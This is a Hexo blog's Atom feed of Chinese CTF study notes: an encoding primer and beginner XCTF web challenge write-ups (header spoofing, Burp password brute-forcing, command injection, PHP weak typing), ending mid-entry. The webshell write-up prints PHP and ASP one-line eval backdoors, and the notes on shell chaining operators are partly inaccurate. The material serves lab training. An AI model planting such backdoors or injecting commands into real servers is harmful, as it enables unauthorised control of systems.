<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://singlemindedt.github.io/"/>
  <updated>2019-09-08T06:10:50.499Z</updated>
  <id>https://singlemindedt.github.io/</id>
  
  <author>
    <name>Smtsec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF中常见编码</title>
    <link href="https://singlemindedt.github.io/2019/09/08/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81%E6%80%BB%E7%BB%93/"/>
    <id>https://singlemindedt.github.io/2019/09/08/CTF中常见编码总结/</id>
    <published>2019-09-08T01:05:00.000Z</published>
    <updated>2019-09-08T06:10:50.499Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h1><p>  ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是现今最通用的单字节编码系统，并等同于国际标准ISO/IEC 646。</p><h2 id="编码方法"><a href="#编码方法" class="headerlink" title="编码方法"></a>编码方法</h2><p>  因为1位二进制数可以表示（2^1=）2种状态：0、1；而2位二进制数可以表示（2^2）=4种状态：00、01、10、11；依次类推，7位二进制数可以表示（2^7=）128种状态，每种状态都唯一地编为一个7位的二进制码，对应一个字符（或控制码），这些码可以排列成一个十进制序号0～127。所以，7位ASCII码是用七位二进制数进行编码的，可以表示128个字符。<br>  第0～32号及第127号(共34个)是控制字符或通讯专用字符，如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BEL（振铃）等；通讯专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等；</p><h2 id="ASCII码大致可以分作三部分组成："><a href="#ASCII码大致可以分作三部分组成：" class="headerlink" title="ASCII码大致可以分作三部分组成："></a>ASCII码大致可以分作三部分组成：</h2><p>第一部分是：<strong>ASCII非打印控制字符</strong><br>第二部分是：<strong>ASCII打印字符</strong><br>第三部分是：<strong>扩展ASCII打印字符</strong> </p><h3 id="第一部分：ASCII非打印控制字符表"><a href="#第一部分：ASCII非打印控制字符表" class="headerlink" title="第一部分：ASCII非打印控制字符表"></a>第一部分：ASCII非打印控制字符表</h3><p>ASCII表上的数字0–31分配给了控制字符，用于控制像打印机等一些外围设备。例如，12代表换页/新页功能。此命令指示打印机跳到下一页的开头。（参详ASCII码表中0-31）</p><h3 id="第二部分：ASCII打印字符"><a href="#第二部分：ASCII打印字符" class="headerlink" title="第二部分：ASCII打印字符"></a>第二部分：ASCII打印字符</h3><p>数字 32–126 分配给了能在键盘上找到的字符，当您查看或打印文档时就会出现。数字127代表 DELETE 命令。（参详ASCII码表中32-127）<br><img src="/images/ASCII.jpg" alt="ASCII"></p><h3 id="第三部分：扩展ASCII打印字符"><a href="#第三部分：扩展ASCII打印字符" class="headerlink" title="第三部分：扩展ASCII打印字符"></a>第三部分：扩展ASCII打印字符</h3><p>扩展的ASCII字符满足了对更多字符的需求。扩展的ASCII包含ASCII中已有的128个字符（数字0–32显示在下图中），又增加了128个字符，总共是256个。即使有了这些更多的字符，许多语言还是包含无法压缩到256个字符中的符号。因此，出现了一些ASCII的变体来囊括地区性字符和符号。例如，许多软件程序把ASCII表（又称作ISO8859-1）用于北美、西欧、澳大利亚和非洲的语言。<br><img src="/images/ascii127-255.jpg" alt="ascii127-255"></p><h2 id="特征特点："><a href="#特征特点：" class="headerlink" title="特征特点："></a>特征特点：</h2><p><strong>用1个字节的8位数来编码英文字符集，即所有字母数字等英文符号可以用二进制数、十进制、十六进制来表示。</strong></p><hr><h1 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h1><p>Unicode是一个编码方案，Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。<br>Unicode 编码共有三种具体实现，分别为<strong>utf-8</strong>,<strong>utf-16</strong>,<strong>utf-32</strong>，其中utf-8占用一到四个字节，utf-16占用二或四个字节，utf-32占用四个字节。</p><h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>UTF-8以字节为单位对Unicode进行编码。从Unicode到UTF-8的编码方式如下：<br>|Unicode编码(十六进制)|UTF-8 字节流(二进制)|<br>|:——–:|:————-:|<br>| 000000-00007F | 0xxxxxxx |<br>| 000080-0007FF | 110xxxxx 10xxxxxx |<br>| 000800-00FFFF | 1110xxxx 10xxxxxx 10xxxxxx|<br>| 010000-10FFFF |    11110xxx10xxxxxx10xxxxxx10xxxxxx|<br>UTF-8的特点是对不同范围的字符使用不同长度的编码。对于0x00-0x7F之间的字符，UTF-8编码与ASCII编码完全相同。UTF-8编码的最大长度是4个字节。从上表可以看出，4字节模板有21个x，即可以容纳21位二进制数字。Unicode的最大码位0x10FFFF也只有21位。<br>例1：“汉”字的Unicode编码是0x6C49。0x6C49在0x0800-0xFFFF之间，使用3字节模板：1110xxxx 10xxxxxx 10xxxxxx。将0x6C49写成二进制是：0110 1100 0100 1001， 用这个比特流依次代替模板中的x，得到：11100110 10110001 10001001，即E6 B1 89。</p><p>例2：Unicode编码0x20C30在0x010000-0x10FFFF之间，使用4字节模板：11110xxx 10xxxxxx 10xxxxxx 10xxxxxx。将0x20C30写成21位二进制数字（不足21位就在前面补0）：0 0010 0000 1100 0011 0000，用这个比特流依次代替模板中的x，得到：11110000 10100000 10110000 10110000，即F0 A0 B0 B0。</p><h2 id="UTF-8-UTF-32"><a href="#UTF-8-UTF-32" class="headerlink" title="[UTF-8\UTF-32]"></a>[UTF-8\UTF-32]</h2><p><a href="https://baike.baidu.com/item/Unicode/750500" target="_blank" rel="noopener">UTF-8\UTF-32</a></p><h2 id="Unicode一般有四种表示形式"><a href="#Unicode一般有四种表示形式" class="headerlink" title="Unicode一般有四种表示形式"></a>Unicode一般有四种表示形式</h2><table><thead><tr><th align="center">&amp;#x [Hex]</th><th align="center">&#x0054;&#x0068;&#x0065;</th></tr></thead><tbody><tr><td align="center">&amp;# [Decimal]</td><td align="center">&#00084;&#00104;&#00101;</td></tr><tr><td align="center">\U [Hex]</td><td align="center">\U0054\U0068\U0065</td></tr><tr><td align="center">\U+ [Hex]</td><td align="center">\U+0054\U+0068\U+0065</td></tr></tbody></table><h2 id="特征特点：-1"><a href="#特征特点：-1" class="headerlink" title="特征特点："></a>特征特点：</h2><p>国际标准字符，将全球的各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台文本信息的转换，当编码和解码的字符集出现不一致的时候就会出现乱码。</p><hr><h1 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h1><p>url编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值 ，将它们以name/value参数编码（移去那些不能传送的字符，将数据排行等等）作为URL的一部分或者分离地发给服务器。不管哪种情况，在服务器端的表单输入格式样子象这样：<br><strong>theName=Ichabod+Crane&amp;gender=male&amp;status=missing&amp; ;headless=yes</strong><br><strong>URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。</strong></p><h2 id="编码规则"><a href="#编码规则" class="headerlink" title="编码规则"></a>编码规则</h2><p>URL编码遵循下列规则： 每对name/value由&amp;；符分开；每对来自表单的name/value由=符分开。如果用户没有输入值给这个name，那么这个name还是出现，只是无值。任何特殊的字符（就是那些不是简单的七位ASCII，如汉字）将以百分符%用十六进制编码，当然也包括象 =,&amp;；，和 % 这些特殊的字符。其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。<br>比如：</p><ul><li>“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。</li><li>空格字符，ascii 码是 32，对应16 进制是‘20’，那么 urlencode 编码结果是:%20。</li></ul><p>URL编码平时是用不到的，因为IE会自动将输入到地址栏的非数字字母转换为url编码。曾有人提出数据库名字里带上“#”以防止被下载，因为IE遇到#就会忽略后面的字母。破解方法很简单——<strong>用url编码%23替换掉#</strong>。</p><h2 id="特征特点：-2"><a href="#特征特点：-2" class="headerlink" title="特征特点："></a>特征特点：</h2><p>字符ASCII码的十六进制，并在前面加上%<br><img src="/images/URL1.jpg" alt="URL"></p><hr><h1 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h1><p>Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。</p><p>Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。采用Base64编码具有不可读性，需要解码后才能阅读。</p><p>Base64由于以上优点被广泛应用于计算机的各个领域，然而由于输出内容中包括两个以上“符号类”字符（+, /, =)，不同的应用场景又分别研制了Base64的各种“变种”。为统一和规范化Base64的输出，Base62x被视为无符号化的改进版本。</p><p>Base64要求把每三个8Bit的字节转换为四个6Bit的字节（3<em>8 = 4</em>6 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1/3。</p><h2 id="特征："><a href="#特征：" class="headerlink" title="特征："></a>特征：</h2><p>密文由64个字符(A-Z,a-z,0-9,+,/)组成，末尾可能会出现1或2个’=’ 最多有2个 </p><h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><ol><li>把3个字节变成4个字节。</li><li>每76个字符加一个换行符。</li><li>最后的结束符也要处理。</li></ol><p><em>字符串转为2进制，每3个8位二进制转化为4个6位二进制，六位二进制转化为十进制，根据十进制数值在base64编码表中获取字符。Base64编码将串起来的二进制以6位进行分割.所以分切之前的二进制位数应该是24的倍数(即6,8的最小公倍数).如果不足24位,则在编码后数据后面添加”=”(=为填充字符)</em><br><strong>例子1</strong><br>转换前 11111111, 11111111, 11111111 （二进制）<br>转换后 00111111, 00111111, 00111111, 00111111 （二进制）<br>上面的三个字节是原文，下面的四个字节是转换后的Base64编码，其前两位均为0。<br>转换后，我们用一个码表来得到我们想要的字符串（也就是最终的Base64编码），这个表是这样的：（摘自RFC2045）<br>转换表：<br><img src="/images/base64.jpg" alt="base64"></p><p><strong>例子2</strong><br>转换前 10101101,10111010,01110110<br>转换后 00101011, 00011011 ,00101001 ,00110110<br>十进制 43 27 41 54<br>对应码表中的值 r b p 2<br>所以上面的24位编码，编码后的Base64值为 rbp2<br>解码同理，把 rbq2 的二进制位连接上再重组得到三个8位值，得出原码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ASCII码表&quot;&gt;&lt;a href=&quot;#ASCII码表&quot; class=&quot;headerlink&quot; title=&quot;ASCII码表&quot;&gt;&lt;/a&gt;ASCII码表&lt;/h1&gt;&lt;p&gt;  ASCII（American Standard Code for Information Int
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
    
      <category term="编码" scheme="https://singlemindedt.github.io/tags/%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界之Web新手（7-12）</title>
    <link href="https://singlemindedt.github.io/2019/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B9%8BWeb%E6%96%B0%E6%89%8B%EF%BC%887-12%EF%BC%89/"/>
    <id>https://singlemindedt.github.io/2019/09/05/攻防世界之Web新手（7-12）/</id>
    <published>2019-09-05T13:09:03.000Z</published>
    <updated>2019-09-05T14:09:35.321Z</updated>
    
    <content type="html"><![CDATA[<h1 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p>小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )<br>打开链接空白，查看源码，有如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">dechiffre</span><span class="params">(pass_enc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pass = <span class="string">"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65"</span>;</span><br><span class="line">    <span class="keyword">var</span> tab = pass_enc.split(<span class="string">','</span>);</span><br><span class="line">    <span class="keyword">var</span> tab2 = pass.split(<span class="string">','</span>);</span><br><span class="line">    <span class="keyword">var</span> i, j, k, l = <span class="number">0</span>,</span><br><span class="line">        m, n, o, p = <span class="string">""</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = tab.length;</span><br><span class="line">    k = j + (l) + (n = <span class="number">0</span>);</span><br><span class="line">    n = tab2.length;</span><br><span class="line">    <span class="keyword">for</span> (i = (o = <span class="number">0</span>); i &lt; (k = j = n); i++) &#123;</span><br><span class="line">        o = tab[i - l];</span><br><span class="line">        p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = (o = <span class="number">0</span>); i &lt; (k = j = n); i++) &#123;</span><br><span class="line">        o = tab[i - l];</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">5</span> &amp;&amp; i &lt; k - <span class="number">1</span>)</span><br><span class="line">            p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    p += String.fromCharCode(tab2[<span class="number">17</span>]);</span><br><span class="line">    pass = p;</span><br><span class="line">    <span class="keyword">return</span> pass;</span><br><span class="line">&#125;</span><br><span class="line">String[<span class="string">"fromCharCode"</span>](dechiffre(</span><br><span class="line">    <span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">h = window.prompt(<span class="string">'Enter password'</span>);</span><br><span class="line">alert(dechiffre(h));</span><br></pre></td></tr></table></figure><p>这一长串16进制数很可疑，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br></pre></td></tr></table></figure><p>转字符得到：55,56,54,79,115,69,114,116,107,49,50<br>再将其转换为10进制ASCII码对应的字符得到 ：786OsErtk12<br>加上题目给出的格式得到flag（解码函数似乎不能得到正确密码//orz？）</p><hr><h1 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师告诉小宁其实xff和referer是可以伪造的。<br>打开链接如图：<br><img src="/images/7.1.png" alt="1"></p><p>X-Forwarded-For和Referer<br><strong>XFF构造来源IP</strong><br><strong>Referer构造来源浏览器</strong><br>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理<br>利用bp抓包：<br><img src="/images/7.2.png" alt="1"></p><p>在HTTP头添加：X-Forwarded-For:123.123.123.123<br><img src="/images/7.3.png" alt="1"><br>得到下图提示：<br><img src="/images/7.4.png" alt="1"><br>再加一条Referer:<a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a> 得到flag。<br><img src="/images/7.5.png" alt="1"><br>由于每次添加都要重新输入，这里可以利用Repeater功能：<br><img src="/images/7.6.png" alt="1"><br>得到：<br><img src="/images/7.7.png" alt="1"><br>可以在左边直接编辑Request—&gt;右侧得到Response：<br><img src="/images/7.8.png" alt="1"><br>Response—&gt;Flag!<br><img src="/images/7.9.png" alt="1"></p><p>自己编辑的时候注意Target的格式：<br><img src="/images/7.10.png" alt="1"><br>去掉请求协议<strong>http://</strong><br><img src="/images/7.11.png" alt="1"></p><p><strong>URL与URI：<a href="https://blog.csdn.net/lslk9898/article/details/86490383" target="_blank" rel="noopener">https://blog.csdn.net/lslk9898/article/details/86490383</a></strong></p><hr><h1 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><p>小宁写了一个登陆验证页面，随手就设了一个密码。<br><img src="/images/8.png" alt="2"><br>根据弹窗的提示，用户名必须是admin<br>将usename设置为admin，随手！！！真的是随手，输了个123456，结果对了hhh :)<br><img src="/images/8.1.png" alt></p><p>—————————-正常解法———————-<br>用Burp Suite对它进行密码爆破，<br>可以先试着输入username=admin和password=11111,以确定爆破位置。<br>Action—&gt;send to Intruder<br><img src="/images/8.2.png" alt><br><strong>基本配置：</strong><br>1、在消息编辑器的上方，有一个下拉选择框，攻击类型（Attack Type），几种不同的方式，这里选择：<strong>集束炸弹模式（Cluster bomb）</strong> 它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），依次遍历所有的Payload。它与草叉模式的主要区别在于，执行的Payload数据Payload组的乘积。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起四次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为A和D，第三次使用的Payload分别为B和C，第四次使用的Payload分别为B和D。<br><img src="/images/8.3.png" alt><br>2、由于username规定用admin；<br><strong>简单列表（Simple list）</strong> ——最简单的Payload类型，通过配置一个字符串列表作为Payload，也可以手工添加字符串列表或从文件加载字符串列表。其设置界面如下图<br><img src="/images/8.4.png" alt><br>3、导入密码list<br><img src="/images/8.5.png" alt></p><p>4、可选项设置（Options）<br>可选项设置主要包括请求消息头设置、请求引擎设置、攻击结果设置、grep match, grep extract, grep payloads,以及重定向设置。在使用中，你可以在攻击前进行设置，也可以在攻击过程中做这些选项的调整。<br><img src="/images/8.6.png" alt><br><strong>开始爆破：</strong><br><img src="/images/.png" alt><br>可以明显看到出现了长度不一样的响应，123456应该就是正确密码，查看Response得到Flag。<br><img src="/images/8.7.png" alt></p><hr><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h2><p>小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。<br><img src="/images/9.png" alt></p><h2 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h2><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的<strong>一种命令执行环境</strong>，也可以将其称做为一种<strong>网页后门</strong>。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。<br>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。<strong>webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限</strong>。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。<br><a href="https://blog.csdn.net/Breeze_CAT/article/details/80044676" target="_blank" rel="noopener">上传木马拿webshell的方法汇总</a><br>图片给出的代码为php一句话木马：<strong><?php @eval($_POST['shell']);?></strong><br>一句话木马的工作原理：一句话木马分析服务端与客户端。</p><p>“一句话木马”服务端（是用于本地的html提交脚本木马文件）<br>就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为 &lt;%execute request(“value”)%&gt; 其中value可以自己修改<br>“一句话木马”客户端（远程服务器上被插入一句话的asp可执行文件）<br>用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件</p><ul><li>用中国菜刀或者蚁剑等工具可以上传或执行命令，密码是shell。</li></ul><p><img src="/images/9.1.png" alt><br>连接成功：<br><img src="/images/9.2.png" alt><br>选择双击：<br><img src="/images/9.3.png" alt><br>看到flag.txt,打开：<br><img src="/images/9.4.png" alt></p><hr><h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h1><h2 id="题目描述：-4"><a href="#题目描述：-4" class="headerlink" title="题目描述："></a>题目描述：</h2><p>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p><h2 id="知识补充：-1"><a href="#知识补充：-1" class="headerlink" title="知识补充："></a>知识补充：</h2><h3 id="1、ping-（网络诊断工具）"><a href="#1、ping-（网络诊断工具）" class="headerlink" title="1、ping （网络诊断工具）"></a>1、ping （网络诊断工具）</h3><p>Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。<br>应用格式：ping空格IP地址。<em>该命令还可以加许多参数使用，具体是键入ping按回车即可看到详细说明。</em><br>作为一个生活在网络上的管理员或者黑客来说，ping命令是第一个必须掌握的DOS命令，它所利用的原理是这样的：<strong>利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少。</strong><br>ping指的是端对端连通，通常用来作为可用性的检查， 但是某些病毒木马会强行大量远程执行ping命令抢占你的网络资源，导致系统变慢，网速变慢。严禁ping入侵作为大多数防火墙的一个基本功能提供给用户进行选择。</p><h3 id="2、有关命令执行的知识"><a href="#2、有关命令执行的知识" class="headerlink" title="2、有关命令执行的知识"></a>2、有关命令执行的知识</h3><p>windows或linux下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp; command2 ：先执行command2后执行command1</span><br><span class="line">command1 &amp;&amp; command2 ：先执行command1后执行command2</span><br><span class="line">command1 | command2 ：只执行command2</span><br><span class="line">command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</span><br></pre></td></tr></table></figure><h3 id="3、WAF"><a href="#3、WAF" class="headerlink" title="3、WAF"></a>3、WAF</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br>Web应用防火墙会对HTTP的请求进行异常检测，拒绝不符合HTTP标准的请求。并且，它也可以只允许HTTP协议的部分选项通过，从而减少攻击的影响范围。甚至，一些Web应用防火墙还可以严格限定HTTP协议中那些过于松散或未被完全制定的选项。<br>（<a href="https://www.waitalone.cn/waf-bypass-methods-and-reflection.html" target="_blank" rel="noopener">WAF绕过</a>）此题给出未开WAF，所以不用考虑这一步。</p><h3 id="4、还需要掌握一些常用的命令"><a href="#4、还需要掌握一些常用的命令" class="headerlink" title="4、还需要掌握一些常用的命令"></a>4、还需要掌握一些常用的命令</h3><p>ls 对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。<br>Cd 改变工作目录，将当前工作目录改变到指定的目录下。<br>cat是打印文件内容<br>tac 是反向打印<br>less 文件名：分页显示文件内容（如less /etc/passwd）<br>Find 沿着文件层次结构向下遍历，匹配符合条件的文件，并执行相应操作。<br>关于find可以参考：<a href="https://www.jianshu.com/p/16af649d9b6d" target="_blank" rel="noopener">https://www.jianshu.com/p/16af649d9b6d</a><br>*&lt;利用截断来执行行的命令，如’$’ 和 ‘ ; ‘和 ‘|’ 和 ‘-‘ 和 ‘(‘ 和 ‘ ) ‘ 和 ‘ “ ‘ 和 ‘||’ 和’&amp;&amp;’ 和 ‘&amp;’ 和 ‘{‘ 和 ‘}’等&gt;*<br>实际操作：<br><img src="/images/.2.png" alt><br><img src="/images/.2.1png" alt></p><p>试着使用命令连接符，查看目录<br><img src="/images/2.2.png" alt><br><img src="/images/2.3.png" alt><br>发现有home目录，看看里面有啥：<br><img src="/images/2.4.png" alt><br>发现有flag.txt;或者直接根据文件名或正则表达式进行搜索，如下：<br><img src="/images/2.5.png" alt><br>得到flag.txt在home下，cat一下：<br><img src="/images/2.6.png" alt></p><p>同时这道题，查看代码可以发现：POST传参是通过参数target，而target就是我们所要输入的值<br><img src="/images/2.7.png" alt><br>尝试post传值：<br><img src="/images/2.8.png" alt><br>得到flag:<br><img src="/images/2.9.png" alt><br><img src="/images/2.10.png" alt></p><hr><h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>##题目描述：<br>小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。<br>打开链接：<br><img src="/images/3.png" alt><br>很简单的PHP代码：a要等于0，又不能等于0；b不能是数字，但还要大于1234</p><p><em>is_numeric（）来函数用于检测变量是否为数字或数字字符串。</em><br><em>如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE。</em></p><p>此处靠php弱类型比较：可查看我的这篇博文<br>构造如下url:<br><img src="/images/3.1.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;simple-js&quot;&gt;&lt;a href=&quot;#simple-js&quot; class=&quot;headerlink&quot; title=&quot;simple_js&quot;&gt;&lt;/a&gt;simple_js&lt;/h1&gt;&lt;h2 id=&quot;题目描述：&quot;&gt;&lt;a href=&quot;#题目描述：&quot; class=&quot;header
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="Web" scheme="https://singlemindedt.github.io/categories/CTF/Web/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Images</title>
    <link href="https://singlemindedt.github.io/2019/09/04/images/"/>
    <id>https://singlemindedt.github.io/2019/09/04/images/</id>
    <published>2019-09-04T09:37:45.000Z</published>
    <updated>2019-09-05T14:33:05.157Z</updated>
    
    <content type="html"><![CDATA[<p>Inset demo …</p><p><img src="1.jpg" alt="demo"><br><img src="im/1.jpg" alt="demo"><br><img src="/images/1.jpg" alt="success"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Inset demo …&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;1.jpg&quot; alt=&quot;demo&quot;&gt;&lt;br&gt;&lt;img src=&quot;im/1.jpg&quot; alt=&quot;demo&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/1.jpg&quot; alt=&quot;success&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>攻防世界之Web新手（1-6）</title>
    <link href="https://singlemindedt.github.io/2019/09/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B9%8BWeb%E6%96%B0%E6%89%8B%EF%BC%881-6%EF%BC%89/"/>
    <id>https://singlemindedt.github.io/2019/09/04/攻防世界之Web新手（1-6）/</id>
    <published>2019-09-04T07:11:48.415Z</published>
    <updated>2019-09-04T09:49:49.710Z</updated>
    
    <content type="html"><![CDATA[<h1 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。<br>打开链接如下：<br><img src="http://wx1.sinaimg.cn/mw690/0070Pzw7gy1g6nlcr015bj30g7062dfx.jpg" alt="1"><br>试试右键的确不管用了，直接F12，找到flag<br><img src="http://wx4.sinaimg.cn/mw690/0070Pzw7gy1g6nlc0awuuj30kc067wvy.jpg" alt="2"></p><p>另外还可以通过view-source：url查看源代码：<br><img src="http://wx3.sinaimg.cn/mw690/0070Pzw7gy1g6nlcvm0hgj30lq0cg3yt.jpg" alt="3"></p><p>其实还可以禁用Js代码，这样右键就可以用了：<br><img src="http://wx4.sinaimg.cn/mw690/0070Pzw7gy1g6nlczbhbwj30pn08b74w.jpg" alt="4"></p><hr><h1 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？<br>知识补充：</p><h3 id="两种-HTTP-请求方法：GET-和-POST"><a href="#两种-HTTP-请求方法：GET-和-POST" class="headerlink" title="两种 HTTP 请求方法：GET 和 